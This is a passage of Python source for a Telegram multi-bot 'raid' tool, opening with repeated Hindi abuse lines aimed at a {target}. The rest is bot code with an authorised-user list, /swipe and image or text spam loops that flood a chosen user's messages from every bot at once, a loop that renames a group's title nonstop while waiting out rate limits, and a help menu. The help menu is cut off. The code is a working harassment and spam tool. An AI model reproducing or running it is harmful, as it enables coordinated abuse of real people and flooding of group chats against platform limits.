𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 ??𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁??𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝐑 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝐈 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐",
]

SUDO_USERS = set(OWNER_IDS)
global_delay = 0.05
spam_delay = 0.5
global_mode = False
MAX_THREADS = 500
current_threads = 70
bot_usernames = []
sudo_usernames = {} # user_id: username
setmphoto_data = {}  # chat_id: {"photo_id": ..., "caption": ...}
custom_layout = ""
LAYOUT_FILE = "layout.json"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def load_data():
    global SUDO_USERS, sudo_usernames
    if os.path.exists(SUDO_FILE):
        try:
            with open(SUDO_FILE, "r") as f:
                data = json.load(f)
                if isinstance(data, list):
                    SUDO_USERS.update(data)
                elif isinstance(data, dict):
                    # For compatibility if we ever store it as dict
                    SUDO_USERS.update([int(k) for k in data.keys()])
                    sudo_usernames.update(data)
        except: pass
    
    # Check if sudo_names.json exists
    if os.path.exists("sudo_names.json"):
        try:
            with open("sudo_names.json", "r") as f:
                sudo_usernames.update(json.load(f))
        except: pass
    
    # Ensure all SUDO_USERS have an entry in sudo_usernames to avoid "Unknown"
    for uid in SUDO_USERS:
        if str(uid) not in sudo_usernames:
            sudo_usernames[str(uid)] = "User_" + str(uid)
    
    global custom_layout
    if os.path.exists(LAYOUT_FILE):
        try:
            with open(LAYOUT_FILE, "r") as f:
                custom_layout = json.load(f).get("layout", "")
        except: pass

def save_sudo():
    with open(SUDO_FILE, "w") as f: json.dump(list(SUDO_USERS), f)
    with open("sudo_names.json", "w") as f: json.dump(sudo_usernames, f)

# Slaves
SLAVES_FILE = "slaves.json"
slaves_list = []

def load_slaves():
    global slaves_list
    if os.path.exists(SLAVES_FILE):
        try:
            with open(SLAVES_FILE, "r") as f:
                data = json.load(f)
            migrated = []
            for item in data:
                if isinstance(item, str):
                    migrated.append({"name": item, "videos": []})
                else:
                    migrated.append(item)
            slaves_list = migrated
        except:
            slaves_list = []

def save_slaves():
    with open(SLAVES_FILE, "w") as f:
        json.dump(slaves_list, f)

target_names = {}
swipe_tasks = {} # chat_id: [asyncio tasks]
gnc_cache = {}   # {user_id: text}

GNC_PREFIXES = [
    "🌈₊˚🎀⊹♡🌻✨",
    "👑⋆˚࿔⚡︎𖤐🔥",
    "☠︎︎⋆༒︎𖤐⛧⚚",
    "𓂃˚✦₊˚𓆩♡𓆪",
    "⚡︎⋆𖤐☠︎︎👑🔥",
    "🎮⋆👾🎧⚡︎🕹️",
    "𓂀☥𓋹𓁈𓆣",
    "💀⃤༒︎𖤐⚚⛧",
    "☁️⋆｡˚🕊️✨♡",
    "🦋⃤♡⃤🌙✧☁️",
    "🔱⚡︎𖤐👑⛧",
    "🌊⋆🐚𓇼✨🫧",
    "🩸༒︎☠︎︎⚚𖤓",
]
GNC_SUFFIXES = [
    "જ⁀➴ 👑 ⁀➴ ⚡︎ ⁀➴ 👑 ⁀➴ ✨ ⁀➴ 🔥 ⁀➴ 👑જ⁀➴ 👑 ⁀➴ ⚡︎ ⁀➴ 👑 ⁀➴ ✨ ⁀➴ 🔥 ⁀➴ 👑જ⁀➴ 👑 ⁀➴ ⚡︎ ⁀➴ 👑 ⁀➴ ✨ ⁀➴ 🔥 ⁀➴ 👑જ⁀➴ 👑 ⁀➴ ⚡︎ ⁀➴ 👑 ⁀➴ ✨ ⁀➴ 🔥 ⁀➴ 👑જ⁀➴ 👑 ⁀➴ ⚡︎ ⁀➴ 👑 ⁀➴ ✨ ⁀➴ 🔥 ⁀➴ 👑",
    "⋆🌷🫧💭₊˚ෆִ໋🌷͙֒₊˚*ੈ♡⸝⸝🪐༘⋆‧₊˚🖇️✩ ₊˚🎧⊹♡𓍢ִ໋🌷֒✧ ༘ ⋆｡♡ପ꒰˶•༝ •˶꒱ଓ 🌸🤍⋆.˚✮🎧✮˚.⋆༘⋆🌷🫧💭₊˚ෆִ໋🌷͙֒₊˚*ੈ♡⸝⸝🪐༘⋆‧₊˚🖇️✩ ₊˚🎧⊹♡𓍢ִ໋🌷֒✧ ༘ ⋆｡♡ପ꒰˶•༝ •˶꒱ଓ 🌸🤍⋆.˚✮🎧✮˚.⋆༘⋆🌷🫧💭₊˚ෆִ໋🌷͙֒₊˚*ੈ",
    "𓊆ྀི🤍𓊇ྀི(っ҂° ཀ•)っ🕊️⊹˚.·:*¨༺ ☣ ༻¨*:·✃𓄧꒷꒦🎀𓊆ྀི🤍𓊇ྀི(っ҂° ཀ•)っ🕊️⊹˚.·:*¨༺ ☣ ༻¨*:·✃𓄧꒷꒦🎀𓊆ྀི🤍𓊇ྀི(っ҂° ཀ•)っ🕊️⊹˚.·:*¨༺ ☣ ༻¨*:·✃𓄧꒷꒦🎀𓊆ྀི🤍𓊇ྀི(っ҂° ཀ•)っ🕊️⊹˚.·:*¨༺ ☣ ༻¨*:·✃𓄧꒷꒦🎀𓊆ྀི🤍𓊇ྀི",
    "𓂃 ࣪˖ ִֶָ🐇་༘࿐⋆⭒˚.⋆🪐 ⋆⭒˚.⋆ִֶָ. ..𓂃 ࣪ ִֶָ🦋་༘࿐°❀⋆.ೃ࿔*:･°❀⋆.ೃ࿔*:･⋆⭒˚.⋆🪐ִֶָ. ..𓂃 ࣪ ִֶָ🦋་༘࿐⋆⭒˚.⋆🪐 ⋆⭒˚.⋆ִֶָ𓂃 ࣪˖ ִֶָ🐇་𓂃 ࣪˖ ִֶָ🐇་༘࿐⋆⭒˚.⋆🪐 ⋆⭒˚.⋆ִֶָ. ..𓂃 ࣪ ִֶָ🦋་༘࿐°❀⋆.ೃ࿔*:･°❀⋆.ೃ࿔*:･⋆⭒˚.⋆🪐ִֶָ. ..𓂃 ࣪ ִֶָ🦋་༘࿐⋆⭒˚.⋆🪐 ⋆⭒˚.⋆ִֶָ𓂃 ࣪˖ ִֶָ🐇་𓂃 ࣪˖ ִֶָ🐇་༘࿐",
    "⚡︎🌃𓍙.ೃ࿔*:･⁺‧₊˚ ཐི⋆♱⋆ཋྀ ˚₊‧⁺°🥂⋆.ೃ🍾࿔*:･ོ༘₊⁺☀︎₊⁺⋆.˚~.*🍋 ྀིྀི *.~⁺‧₊˚ ཐི⋆♱⋆ཋྀ ˚₊‧⁺🌃𓍙.ೃ࿔*:･⁺‧₊˚ ཐི⋆♱⋆ཋྀ ˚₊‧⁺°🥂⋆.ೃ🍾࿔*:･ོ༘₊⁺☀︎₊⁺⋆.˚~.*🍋 ྀིྀི *.~⁺‧₊˚ ཐི⋆♱⋆ཋྀ ˚₊‧⁺🌃𓍙.ೃ࿔*:･⁺‧₊˚ ཐི⋆♱⋆ཋྀ ˚₊‧⁺°🥂⋆.ೃ🍾࿔*:･ོ༘₊⁺☀︎₊⁺⋆.˚~.*🍋",
    "ೀ⋅⁀➴🌻✨જ⁀➴.⋅˚🎀⊹♡₊‧🌻✨🎀⊹♡ೀ⋅⁀➴🌻✨જ⁀➴.⋅˚🎀⊹♡₊‧🌻✨🎀⊹♡ೀ⋅⁀➴🌻✨જ⁀➴.⋅˚🎀⊹♡₊‧🌻✨🎀⊹♡ೀ⋅⁀➴🌻✨જ⁀➴.⋅˚🎀⊹♡₊‧🌻✨🎀⊹♡ೀ⋅⁀➴🌻✨જ⁀➴.⋅˚🎀⊹♡₊‧🌻✨🎀⊹♡ೀ⋅⁀➴🌻✨જ⁀➴.⋅˚🎀⊹♡₊‧🌻✨🎀⊹♡",
    "𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹",
    "💀 ⚚ ☠︎︎ ⛧¨༺ ☣ ༻¨💀 ⚚ ☠︎︎ ⛧¨༺ ☣ ༻¨💀 ⚚ ☠︎︎ ⛧¨༺ ☣ ༻¨💀 ⚚ ☠︎︎ ⛧¨༺ ☣ ༻¨💀 ⚚ ☠︎︎ ⛧💀 ⚚ ☠︎︎ ⛧💀 ⚚ ☠︎︎ ⛧💀 ⚚ ☠︎︎ ⛧¨༺ ☣ ༻¨💀 ⚚ ☠︎︎ ⛧¨༺ ☣ ༻¨💀 ⚚ ☠︎︎ ⛧¨༺ ☣ ༻¨💀 ⚚ ☠︎︎ ⛧¨༺ ☣ ༻¨💀 ⚚ ☠︎︎ ⛧¨༺ ☣ ༻¨",
    "☁️ ✨ 🕊️ ♡ ☁️ ✨ 🕊️ ♡ ☁️ ✨ 🕊️ ♡ ☁️☁️ ✨ 🕊️ ♡ ☁️ ✨ 🕊️ ♡ ☁️ ✨ 🕊️ ♡ ☁️☁️ ✨ 🕊️ ♡ ☁️ ✨ 🕊️ ♡ ☁️ ✨ 🕊️ ♡ ☁️☁️ ✨ 🕊️ ♡ ☁️ ✨ 🕊️ ♡ ☁️ ✨ 🕊️ ♡ ☁️☁️ ✨ 🕊️ ♡ ☁️ ✨ 🕊️ ♡ ☁️ ✨ 🕊️ ♡ ☁️☁️ ✨ 🕊️ ♡ ☁️ ✨ 🕊️ ♡ ☁️ ✨ 🕊️ ♡ ☁️",
    "🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋 🌙 ✧ ☁️ 🦋",
    "🔱 ⚡︎ 👑 ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱🔱 ⚡︎ ?? ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱🔱 ⚡︎ 👑 ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱🔱 ⚡︎ 👑 ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱🔱 ⚡︎ 👑 ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱🔱 ⚡︎ 👑 ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱🔱 ⚡︎ 👑 ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱 ⚡︎ 👑 ⛧ 🔱",
    "🌊 🐚 𓇼 ✨ 🫧 🌊 🐚 𓇼 ✨ 🫧 🌊 🐚 𓇼🌊 🐚 𓇼 ✨ 🫧 🌊 🐚 𓇼 ✨ 🫧 🌊 🐚 𓇼🌊 🐚 𓇼 ✨ 🫧 🌊 🐚 𓇼 ✨ 🫧 🌊 🐚 𓇼🌊 🐚 𓇼 ✨ 🫧 ?? 🐚 𓇼 ✨ 🫧 🌊 🐚 𓇼🌊 🐚 𓇼 ✨ 🫧 🌊 🐚 𓇼 ✨ 🫧 🌊 🐚 𓇼🌊 🐚 𓇼 ✨ 🫧 🌊 🐚 𓇼 ✨ 🫧 🌊 🐚 𓇼",
    "🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸 ☠︎︎ ⚚ 𖤓 🩸",
]
GNC_STYLES = {
    "keng":      (1,  0,  "👑 Kᴇɴɢ 𝐍ᴄ"),
    "aesthetic": (3,  3,  "✨ Aᴇꜱᴛʜᴇᴛɪᴄ 𝐍ᴄ"),
    "dark":      (2,  2,  "☠️ Dᴀʀᴋ 𝐍ᴄ"),
    "cute":      (0,  1,  "🌈 Cᴜᴛᴇ 𝐍ᴄ"),
    "neon":      (4,  4,  "⚡ Nᴇᴏɴ 𝐍ᴄ"),
    "gamer":     (5,  5,  "🎮 Gᴀᴍᴇʀ 𝐍ᴄ"),
    "mythic":    (6,  6,  "🔱 Mʏᴛʜɪᴄ 𝐍ᴄ"),
    "glitch":    (7,  7,  "💀 Gʟɪᴛᴄʜ 𝐍ᴄ"),
    "soft":      (9,  9,  "🦋 Sᴏꜰᴛ 𝐍ᴄ"),
    "crown":     (10, 10, "🔥 Cʀᴏᴡɴ 𝐍ᴄ"),
}
_GNC_STYLE_ORDER = ["keng", "aesthetic", "dark", "cute", "neon", "gamer", "mythic", "glitch", "soft", "crown"]

def _gnc_keyboard(uid):
    keyboard = []
    for i in range(0, len(_GNC_STYLE_ORDER), 2):
        row = []
        for key in _GNC_STYLE_ORDER[i:i+2]:
            lbl = GNC_STYLES[key][2]
            row.append(InlineKeyboardButton(lbl, callback_data=f"gnc_{uid}_{key}"))
        keyboard.append(row)
    return InlineKeyboardMarkup(keyboard)

def _gnc_format(text, style_key):
    pi, si, _ = GNC_STYLES[style_key]
    return f"{GNC_PREFIXES[pi]} {text} {GNC_SUFFIXES[si]}"
swipe_names = {} # chat_id: name
react_mode = {} # chat_id: emoji (string)
dreact_mode = {} # chat_id: {"emojis": [...], "num_bots": N}
group_tasks = {}
spam_tasks = {}
pfp_tasks = {}
slide_targets = set()
slidespam_targets = set()

def only_sudo(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.message: return
        if update.effective_user.id not in SUDO_USERS:
            await update.message.reply_text(UNAUTHORIZED_MESSAGE)
            return
        return await func(update, context)
    return wrapper

@only_sudo
async def swipe_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐊𝐢𝐬𝐢 𝐤𝐞 𝐦𝐬𝐠 𝐩𝐞 𝐫𝐞𝐩𝐥𝐲 𝐤𝐚𝐫𝐤𝐞 /swipe 𝐥𝐢𝐤𝐡𝐨!")
    chat_id = update.message.chat_id
    target_msg_id = update.message.reply_to_message.message_id
    if context.args:
        name = " ".join(context.args)
    else:
        ru = update.message.reply_to_message.from_user
        if ru:
            name = ru.first_name or ru.username or str(ru.id)
        else:
            name = "Target"
    swipe_names[chat_id] = name

    if chat_id in swipe_tasks:
        for t in swipe_tasks[chat_id]: t.cancel()

    async def swipe_loop(bot, cid, tmid, n):
        while True:
            try:
                msg = f"{n} {random.choice(RAID_TEXTS)}"
                await bot.send_message(cid, msg, reply_to_message_id=tmid)
                await asyncio.sleep(global_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(1)

    swipe_tasks[chat_id] = [asyncio.create_task(swipe_loop(bot, chat_id, target_msg_id, name)) for bot in bots]
    await update.message.reply_text(f"⚔️ 𝐒𝐖𝐈𝐏𝐄 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 𝐎𝐍 {name}! 𝐀𝐋𝐋 𝐁𝐎𝐓𝐒 𝐋𝐎𝐂𝐊𝐄𝐃!")

@only_sudo
async def stopswipe_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in swipe_tasks:
        for t in swipe_tasks[cid]: t.cancel()
        del swipe_tasks[cid]
    await update.message.reply_text("🛑 𝐒𝐖𝐈𝐏𝐄 𝐒𝐓𝐎𝐏𝐏𝐄𝐃!")

@only_sudo
async def react_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /react <emoji>")
    react_mode[update.message.chat_id] = context.args[0]
    await update.message.reply_text(f"✅ 𝐑𝐄𝐀𝐂𝐓𝐈𝐎𝐍 𝐒𝐓𝐀𝐑𝐓𝐄𝐃: {context.args[0]}")

@only_sudo
async def stopreact_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    react_mode.pop(update.message.chat_id, None)
    await update.message.reply_text("🛑 𝐑𝐄𝐀𝐂𝐓𝐈𝐎𝐍 𝐒𝐓𝐎𝐏𝐏𝐄𝐃!")

@only_sudo
async def changename_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠 e: /Changename <name>")
    name = " ".join(context.args)
    count = 0
    
    # We need the actual list of bot objects. 
    # In this script, 'bots' is defined at the end of the file.
    # Let's make sure we are accessing the right 'bots' list.
    from telegram.error import TelegramError
    
    for b in bots:
        try:
            # Using the bot instance from the list
            await b.set_my_name(name=name)
            count += 1
        except TelegramError as e:
            logger.error(f"Telegram error for bot: {e}")
        except Exception as e:
            logger.error(f"General error for bot: {e}")
            
    await update.message.reply_text(f"✅ 𝐂𝐇𝐀𝐍𝐆𝐄𝐃 𝐍𝐀𝐌𝐄 𝐎𝐅 {count} 𝐁𝐎𝐓𝐒!")

@only_sudo
async def setpfp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.photo:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨.")
    await update.message.reply_text("⚠️ 𝐁𝐨𝐭 𝐏𝐅𝐏𝐬 𝐚𝐫𝐞 𝐛𝐞𝐬𝐭 𝐜𝐡𝐚𝐧𝐠𝐞𝐝 𝐯𝐢𝐚 @𝐁𝐨𝐭𝐅𝐚𝐭𝐡𝐞𝐫. 𝐓𝐡𝐞 𝐁𝐨𝐭 𝐀𝐏𝐈 𝐝𝐨𝐞𝐬 𝐧𝐨𝐭 𝐬𝐮𝐩𝐩𝐨𝐫𝐭 𝐝𝐢𝐫𝐞𝐜𝐭 𝐏𝐅𝐏 𝐜𝐡𝐚𝐧𝐠𝐞𝐬.")

async def god_speed_loop(bot, chat_id, base_text):
    while True:
        try:
            # Number of changes per loop adjusted by current_threads
            batch_size = max(1, current_threads // 10) 
            for _ in range(batch_size):
                ext = random.choice(EXONC_TEXTS + NCEMO_EMOJIS)
                await bot.set_chat_title(chat_id, f"{base_text} {ext}")
                await asyncio.sleep(1) # Added delay to prevent 429 Too Many Requests
            await asyncio.sleep(global_delay + 1)
        except asyncio.CancelledError: break
        except Exception as e:
            if "Too Many Requests" in str(e): await asyncio.sleep(10) # Longer wait for rate limits
            else: await asyncio.sleep(2)

async def spam_loop(bot, chat_id, text):
    while True:
        try:
            await bot.send_message(chat_id, text)
            # Spam speed can be influenced by threads if needed, but keeping it stable
            await asyncio.sleep(spam_delay)
        except asyncio.CancelledError: break
        except: await asyncio.sleep(2)

async def sequence_spam_loop(bot, cid, hater_name):
    idx = 0
    active_templates = [t for t in SPAM_TEMPLATE if t and t.strip()]
    if not active_templates: return
    while True:
        try:
            template = active_templates[idx % len(active_templates)]
            msg = template.replace("{hater}", hater_name).replace("{target}", hater_name)
            if "{emoji}" in msg:
                while "{emoji}" in msg: msg = msg.replace("{emoji}", random.choice(NCEMO_EMOJIS), 1)
            await bot.send_message(cid, msg)
            idx += 1
            await asyncio.sleep(spam_delay)
        except asyncio.CancelledError: break
        except: await asyncio.sleep(1)

@only_sudo
async def imagespam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.photo:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨.")
    cid = update.message.chat_id
    photo_id = update.message.reply_to_message.photo[-1].file_id

    async def image_spam_loop(bot, c, p):
        while True:
            try:
                await bot.send_photo(c, photo=p)
                await asyncio.sleep(spam_delay)
            except asyncio.CancelledError: break
            except: await asyncio.sleep(2)

    if cid in spam_tasks:
        for t in spam_tasks[cid]: t.cancel()
    
    spam_tasks[cid] = [asyncio.create_task(image_spam_loop(bot, cid, photo_id)) for bot in bots]
    await update.message.reply_text("📸 𝐈𝐌𝐀𝐆𝐄 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!")

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 𝐀 ʀ 𝐘 ᴀ ɴ𝐃𝐀𝐃𝐃𝐘 𝐌𝐔𝐋𝐓𝐈-𝐁𝐎𝐓 𝐋𝐎𝐀𝐃𝐄𝐃!\n𝐔𝐬𝐞 /𝐡𝐞𝐥𝐩 𝐟𝐨𝐫 𝐚𝐥𝐥 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬.")

@only_sudo
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """╭━━━〔 💀𝐀 ʀ 𝐘 ᴀ ɴ  𝐁ʜᴀɢᴡᴀɴ💀 〕━━━╮
        ✦ 𝐊ᴇɴɢ 𝐁ᴏᴛ 𝐕𝟐 ✦
╰━━━━━━━━━━━━━━━━━━━━━━╯

╭⧼ 🔔 𝐔ᴛɪʟɪᴛɪᴇs ⧽
│ ◈ /ping        ⤷ ⚡ 𝐋ᴀᴛᴇɴᴄʏ
│ ◈ /status      ⤷ 📊 𝐒ᴛᴀᴛs
│ ◈ /refresh     ⤷ 🔄 𝐑ᴇʟᴏᴀᴅ
╰──────────────╯

╭⧼ ⚡ 𝐍ᴄ 𝐌ᴏᴅᴇ ⧽
│ ◈ /godspeed <TEXT>  ⤷ 🚀 𝐔ʟᴛʀᴀ 𝐍ᴄ
│ ◈ /stopnc           ⤷ 🛑 𝐒ᴛᴏᴘ
│ ◈ /delaync <SEC>    ⤷ ⏳ 𝐃ᴇʟᴀʏ
│ ◈ /threads <NUM>    ⤷ 🧵 𝐓ʜʀᴇᴀᴅs
╰──────────────╯

╭⧼ 🎀 𝐄ᴍᴏᴊɪ 𝐍ᴄ ⧽
│ ◈ /flagnc       ⤷ 🚩 𝐅ʟᴀɢ
│ ◈ /heartnc      ⤷ 💘 𝐇ᴇᴀʀᴛ
│ ◈ /aestheticnc  ⤷ 🎀 𝐀ᴇsᴛʜᴇᴛɪᴄ
│ ◈ /vegetablenc  ⤷ 🥬 𝐕ᴇɢɢɪᴇ
│ ◈ /animalnc     ⤷ 🐺 𝐀ɴɪᴍᴀʟ
│ ◈ /timenc       ⤷ ⏱️ 𝐓ɪᴍᴇ
│ ◈ /kengnc       ⤷ ✨ 𝐊ᴇɴɢ
╰──────────────╯

╭⧼ 🎨 𝐆ɴᴄ 𝐆ᴇɴᴇʀᴀᴛᴏʀ ⧽
